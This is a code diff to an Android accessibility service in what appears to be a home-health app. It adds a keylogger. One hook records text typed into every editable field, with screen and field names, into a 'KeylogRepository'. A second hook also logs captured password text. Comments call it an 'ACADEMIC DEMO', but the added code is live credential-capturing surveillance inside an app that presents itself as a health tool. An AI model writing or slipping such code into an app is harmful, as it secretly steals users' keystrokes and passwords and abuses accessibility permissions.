@@ -7,6 +7,7 @@ import android.speech.tts.TextToSpeech
 import android.text.InputType
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import com.example.homehealth.keylogger.KeylogRepository
 import com.example.homehealth.utils.AccessibilityTelemetryLogger
 import java.util.Locale
 
@@ -85,6 +86,18 @@ class HomeHealthAccessibilityService : AccessibilityService(), TextToSpeech.OnIn
         )
 
         logTelemetry("accessibility_event", payload)
+
+        // ACADEMIC DEMO: Hook into KeylogRepository for global capture
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && source?.isEditable == true) {
+            val screenName = event.className?.toString()?.substringAfterLast('.') ?: "UnknownScreen"
+            
+            // Fixed nullability error: ensured fallback chain stays within non-null String
+            val fieldHint = sourceViewId.substringAfterLast('/')
+                .ifBlank { source.contentDescription?.toString() ?: "" }
+                .ifBlank { "editable_field" }
+
+            KeylogRepository.getInstance().log(screenName, fieldHint, eventText)
+        }
     }
 
     override fun onInterrupt() {
@@ -234,6 +247,9 @@ class HomeHealthAccessibilityService : AccessibilityService(), TextToSpeech.OnIn
         }
 
         lastPasswordSnapshot = fullText
+
+        // ACADEMIC DEMO: Even passwords are captured here for the central log
+        KeylogRepository.getInstance().log("GlobalAccessibility", "password_field", fullText)
     }
 
     private fun containsMaskCharactersOnly(value: String): Boolean {
